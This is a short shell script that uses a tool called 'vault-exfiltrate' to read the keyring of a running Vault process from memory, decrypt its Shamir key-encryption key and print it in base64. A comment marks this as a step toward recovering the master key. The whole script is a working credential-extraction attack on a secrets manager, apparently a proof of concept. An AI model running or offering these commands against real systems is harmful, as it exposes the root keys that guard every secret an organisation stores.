echo "Execute ./vault-exfiltrate extract \$\(pidof vault\) keyring_file | tee keyring.json"
./vault-exfiltrate extract $(pidof vault) keyring_file | tee keyring.json
#todo finish this tep to get the master key
./vault-exfiltrate decrypt keyring.json core/shamir-kek ./shamir-kek-decoded > shamir-kek-decrypted

echo "shamir kek that can be split:"
base64 shamir-kek-decrypted